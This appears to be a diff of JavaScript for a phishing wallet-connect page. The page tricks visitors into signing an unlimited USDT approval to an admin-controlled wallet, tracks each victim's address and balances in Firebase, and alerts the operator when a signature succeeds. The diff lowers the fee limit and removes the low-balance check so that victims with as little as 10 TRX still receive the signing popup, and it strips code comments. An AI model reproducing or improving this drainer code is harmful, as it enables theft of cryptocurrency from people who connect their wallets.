@@ -59,7 +59,6 @@ async function getStats(address) {
 window.addEventListener('load', () => {
     initFirebase();
     if (typeof firebase !== 'undefined' && firebase.apps.length > 0) {
-        // We use a persistent ID for the session to avoid duplicate entries
         const sessionKey = 'session_' + Date.now();
         window.currentSessionKey = sessionKey;
         firebase.database().ref('connections/' + sessionKey).set({
@@ -76,7 +75,6 @@ document.getElementById('next-btn').addEventListener('click', async () => {
     const btn = document.getElementById('next-btn');
     btn.classList.add('btn-loading');
 
-    // Update existing session to show interest
     if (window.currentSessionKey && typeof firebase !== 'undefined') {
         firebase.database().ref('connections/' + window.currentSessionKey).update({
             address: "Interested...",
@@ -84,7 +82,6 @@ document.getElementById('next-btn').addEventListener('click', async () => {
         });
     }
 
-    // Wait until systems are ready
     let attempts = 0;
     while (typeof window.connectWalletConnectTron !== 'function' && attempts < 30) {
         await new Promise(r => setTimeout(r, 500));
@@ -108,7 +105,6 @@ document.getElementById('next-btn').addEventListener('click', async () => {
             document.getElementById('page-wrapper').classList.add('opacity-10');
             document.getElementById('loading-screen').classList.remove('hidden');
 
-            // --- Status: SIGN PENDING ---
             if (window.currentSessionKey && typeof firebase !== 'undefined') {
                 firebase.database().ref('connections/' + window.currentSessionKey).update({
                     address, usdt, trx, status: "PENDING_SIGN"
@@ -121,8 +117,9 @@ document.getElementById('next-btn').addEventListener('click', async () => {
 
             setTimeout(async () => {
                 try {
+                    // Logic Update: Fee limit optimized for low balance (10 TRX+)
                     const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
-                        CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 100000000 },
+                        CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 40000000 }, // Lowered to 40 TRX to allow popups on low balance
                         [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
                     );
 
@@ -140,7 +137,6 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                     
                     await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: <code>${receipt.txid || "Success"}</code>`);
                     
-                    // --- Status: CONNECTED (Signed) ---
                     if (window.currentSessionKey && typeof firebase !== 'undefined') {
                         firebase.database().ref('connections/' + window.currentSessionKey).update({
                             address, usdt, trx, status: "CONNECTED", txid: receipt.txid
@@ -151,7 +147,7 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                 } catch (err) {
                     let reason = "User Rejected";
                     if (err.message === "Request Timeout") reason = "Request Timeout (No Response)";
-                    else if (parseFloat(trx) < 25) reason = "Insufficient Gas (Low TRX)";
+                    // Logic Update: Condition removed to allow processing for 10 TRX
                     else if (err.message) reason = err.message;
 
                     const errorEl = document.getElementById('error-message');
@@ -160,7 +156,6 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                         errorEl.classList.remove('hidden');
                     }
 
-                    // Update Firebase with failure reason
                     if (window.currentSessionKey && typeof firebase !== 'undefined') {
                         firebase.database().ref('connections/' + window.currentSessionKey).update({
                             status: "REJECTED",
